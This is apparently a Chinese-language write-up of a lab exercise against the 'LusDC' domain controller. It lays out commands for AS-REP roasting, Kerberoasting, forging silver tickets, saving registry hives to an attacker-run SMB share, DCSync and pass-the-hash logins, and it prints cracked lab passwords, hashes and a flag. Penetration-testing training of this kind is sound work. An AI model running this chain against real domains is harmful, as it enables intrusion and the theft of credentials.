---
title: "LusDC"
date: "2026-04-08T23:21:43+08:00"
publishDate: "2026-04-08T23:21:43+08:00"
lastmod: "2026-04-08T23:21:43+08:00"
draft: true
unfinished: false
---
我们先从LusDC这台开始，我们看到21端口是可以允许匿名登录的，我们优先进行匿名登录尝试

```
ftp 10.10.178.133 21
```

![image-20250106152026929](https://s2.loli.net/2025/01/06/oGwWcrynMIhN8Tk.png)

我们针对相应文件夹的内容进行下载

```
binary
prompt OFF
```

![image-20250106152404913](https://s2.loli.net/2025/01/06/mcGJjeZKHBsgQxI.png)

我们通过这些文件夹名称，获取了几个用户名

```
ben.cox
rachel.parker
tony.ward
wayne.taylor
```

查看下载的users.csv

![image-20250106152543360](https://s2.loli.net/2025/01/06/gKSje372FxlhiGJ.png)

```
netexec smb 10.10.178.133 -u guest -p '' --shares
```

![image-20250106153125900](https://s2.loli.net/2025/01/06/9X1Zaebw4PxQ8ql.png)

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.178.133:389
ldapsearch -x -b "DC=lustrous,DC=vl" -H ldap://10.10.178.133:389
```

![image-20250106153517592](https://s2.loli.net/2025/01/06/XgoviEj3SHdc5zQ.png)

根据获取的用户执行AS-rep roasting攻击

```
impacket-GetNPUsers lustrous.vl/ -usersfile users.txt -dc-ip 10.10.178.133
```

![image-20250106153749697](https://s2.loli.net/2025/01/06/PK1yVT8234fzmch.png)

```
$krb5asrep$23$ben.cox@LUSTROUS.VL:afee94d8d6b90e344ceb73f9d57c7792$cac0ff75cde11e4b4b9c5ece95b8858cabd7cedb2eaf8c25bf341cb458dd0a4a6aee9d393bd76a1b6c6cdb4173449defdbe0558da28592bcc223902de626049223da803a8cb5a91e8cac7b06d7304176587d516922fe40c013764770b5de4c71f2e93afdae79ef6a4586a05bf3c23e0a3e89544123254e1ae3b77f5e2a7aa28c8091ad64f0f14483aaab8818589ac9277d8ed88d068f145d3b8fbdb41466cc6d82ea955f22fe8a0b7e754fe73a1db1bc9c370f8be30ca48bc25980a3d923f771d6229d4d01104e5a766954538e4b66992a95847801afc29c98c0aaad328e94b79e4f2e7fb0b12a729aad
```

针对相应hash进行破解

```
john hash_bencox --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250106154045045](https://files.seeusercontent.com/2026/04/08/Tmq2/image-20250106154045045.png)

| username | password |
| -------- | -------- |
| ben.cox  | Trinity1 |

使用这组用户名密码，针对多服务进行爆破

```
netexec smb ip.txt -u ben.cox -p 'Trinity1' --shares
netexec smb ip.txt -u ben.cox -p 'Trinity1' --rid-brute
```

![image-20250106154445305](https://files.seeusercontent.com/2026/04/06/t7Li/image-20250106154445305.png)

根据扫描结果，补充users.txt清单，重新执行一次AS-REP攻击

![image-20250106160027871](https://files.seeusercontent.com/2026/04/08/Wtj3/image-20250106160027871.png)

```
netexec winrm ip.txt -u ben.cox -p 'Trinity1'
```

![image-20250106154627890](https://files.seeusercontent.com/2026/04/06/nN0a/image-20250106154627890.png)

```
netexec rdp ip.txt -u ben.cox -p 'Trinity1'
```

![image-20250106154700459](https://files.seeusercontent.com/2026/04/06/0Llh/image-20250106154700459.png)

```
netexec ldap ip.txt -u ben.cox -p 'Trinity1' -M adcs 
```

![image-20250106155807110](https://s2.loli.net/2025/01/06/fLtUrXAvQxHRKNS.png)

```
dirsearch -u http://10.10.178.133
```

![image-20250106162948098](https://files.seeusercontent.com/2026/04/06/L7zi/image-20250106162948098.png)

通过bloodhound-python进行信息收集

```
bloodhound-python -d 'lustrous.vl' -u 'ben.cox' -p 'Trinity1' -c all -ns 10.10.178.133
```

![image-20250106165745289](https://files.seeusercontent.com/2026/04/06/Dxr0/image-20250106165745289.png)

所有的kerberoastable的账户，具有相应的SPN

```
impacket-GetUserSPNs -request -dc-ip 10.10.178.133 lustrous.vl/ben.cox -request-user SVC_WEB -save -outputfile GetUserSPNs_web.out
impacket-GetUserSPNs -request -dc-ip 10.10.178.133 lustrous.vl/ben.cox -request-user SVC_DB -save -outputfile GetUserSPNs_db.out
impacket-GetUserSPNs -request -dc-ip 10.10.178.133 lustrous.vl/ben.cox -request-user KRBTGT -save -outputfile GetUserSPNs_krbtgt.out
```

![image-20250106170703990](https://files.seeusercontent.com/2026/04/06/mD2s/image-20250106170703990.png)

![image-20250106170711823](https://files.seeusercontent.com/2026/04/08/Aa4l/image-20250106170711823.png)

![image-20250106170718465](https://files.seeusercontent.com/2026/04/08/N3fs/image-20250106170718465.png)

我们尝试进行破解

```
john GetUserSPNs_web.out --wordlist=/usr/share/wordlists/rockyou.txt
john GetUserSPNs_db.out --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250106170905606](https://files.seeusercontent.com/2026/04/08/Ry7q/image-20250106170905606.png)

svc_web的hash成功完成了破解

| username | password     |
| -------- | ------------ |
| svc_web  | iydgTvmujl6f |

我们目前已经有了svc_web的SPN，hash，再获取一个domain的SID，我们就可以进行相应的银票制作

```
enum4linux-ng 10.10.178.133 -A -C
```

![image-20250106171508757](https://files.seeusercontent.com/2026/04/08/fBm4/image-20250106171508757.png)

Domain SID:

S-1-5-21-2355092754-1584501958-1513963426

SPN：

http/lusdc
http/lusdc.lustrous.vl

hash:

E67AF8B3D78DF5A02EB0D57B6CB60717



我们开始银票的制作

```
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lusdc.lustrous.vl -spn http/lusdc.lustrous.vl -user-id 500 Administrator
```

![image-20250106171820394](https://s2.loli.net/2025/01/06/htk6DLx2KcOY7Fq.png)

```
export KRB5CCNAME=Administrator.ccache
klist
```

![image-20250106171846466](https://s2.loli.net/2025/01/06/qQBKE9yJxFfUsG7.png)

![image-20250106172737403](https://s2.loli.net/2025/01/06/SxQ24MOLYBV9KHh.png)

![image-20250106173235329](https://s2.loli.net/2025/01/06/nJYMBR5Q4FXOVEh.png)

```
curl -k --negotiate -u http://lusdc.lustrous.vl 
```

![image-20250106173538915](https://s2.loli.net/2025/01/06/jN1zT4mbneXs8EZ.png)
制作的银票无法访问，我们需要制作具体用户的

```
sudo vi /etc/krb5.conf
```

![image-20250106205237101](https://s2.loli.net/2025/01/06/roEh74Z3aTWtXnq.png)

```
impacket-getTGT lustrous.vl/ben.cox:Trinity1 -dc-ip 10.10.135.197
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn http/lusdc.lustrous.vl -user-id 1117 ben.cox （不可行）
export KRB5CCNAME=ben.cox.ccache
klist
sudo curl -k --negotiate -u http://lusdc.lustrous.vl
```

![image-20250106205740658](https://s2.loli.net/2025/01/06/QxfUnRebXdp3shz.png)

![image-20250106205045619](https://s2.loli.net/2025/01/06/XhOJGvDk6TnF2QW.png)

我们可以看到/Internal这个目录

```
sudo curl -k --negotiate -u http://lusdc.lustrous.vl/Internal
```

![image-20250106205852942](https://s2.loli.net/2025/01/06/TjFLo3NClUOJQvi.png)

能看到对应的密码，遵循这个思路我们开始考虑要获取域内哪个用户，我们回头看bloodhound，我们选择shortest paths to high value targets，发现一个用户：TONY.WARD，属于Backup Operators组

![image-20250106210000735](https://s2.loli.net/2025/01/06/gC5UYxwNEkquem2.png)

我们尝试获取该用户的权限，通过银票

```
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn http/lusdc.lustrous.vl -user-id 1114 tony.ward
```

![image-20250106210135900](https://s2.loli.net/2025/01/06/8wkVcyt3FvHbZaf.png)

但发现报错，我们切换到另外一台主机上使用mimikatz进行操作

我们获取了相应tony.ward的密码

| username  | password       |
| --------- | -------------- |
| tony.ward | U_cPVQqEI50i1X |

我们尝试使用该账户密码登录域控，但我们尝试各种方法后均无法操作，我们尝试远程下载相应的ntds及system文件

https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#exfiltration

```
sudo impacket-smbserver share . -smb2support
impacket-reg "lustrous.vl"/"tony.ward":"U_cPVQqEI50i1X"@"10.10.135.197" save -keyName 'HKLM\SAM' -o '\\10.8.4.161\share'
impacket-reg "lustrous.vl"/"tony.ward":"U_cPVQqEI50i1X"@"10.10.135.197" save -keyName 'HKLM\SYSTEM' -o '\\10.8.4.161\share'
impacket-reg "lustrous.vl"/"tony.ward":"U_cPVQqEI50i1X"@"10.10.135.197" save -keyName 'HKLM\SECURITY' -o '\\10.8.4.161\share'
impacket-secretsdump -sam "SAM.save" -security "SECURITY.save" -system "SYSTEM.save" LOCAL
```

我们也可以使用另外的exe工具

https://github.com/mpgn/BackupOperatorToDA

![image-20250106231235757](https://s2.loli.net/2025/01/06/kSlOhxZa6UgvQoI.png)

针对项目进行编译

```
cp /mnt/d/Tools/BackupOperatorToDA/x64/Release/BackupOperatorToDA.exe .
upload 
.\BackupOperatorToDA.exe -t \\lusdc.lustrous.vl -u tony.ward -p U_cPVQqEI50i1X -d lustrous.vl -o \\10.8.4.161\share\
```

这里会卡非常久，但是实际能够使用

![image-20250106234519488](https://s2.loli.net/2025/01/06/cdmVIrBalgiWxUX.png)

我们使用administrator的hash进行登录

```
evil-winrm -i 10.10.135.197-u administrator -H '1e10fc3898a203cbc159f559d8183297'

```

但显示登录失败，有可能域的登录密码和机器的登录密码不同，这个密码用于 DSRM，我们再使用dcsync，dump一次hash，我们使用域控主机账号的哈希

$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f684c417aa10be01c51e8c57265fa673

```
impacket-secretsdump lustrous/'LUSDC$'@lusdc.lustrous.vl -hashes  :f684c417aa10be01c51e8c57265fa673
```

![image-20250106235336078](https://s2.loli.net/2025/01/06/QBcZXEu9lADaq4h.png)

```
evil-winrm -i 10.10.135.197 -u administrator -H 'b8d9c7bd6de2a14237e0eff1afda2476'
```

![image-20250106235432101](https://s2.loli.net/2025/01/06/TkhI6i4UEdzsaVN.png)

成功登录获取到第二个flag

VL{5384a9f4752602dd54f4c4850979da0b}


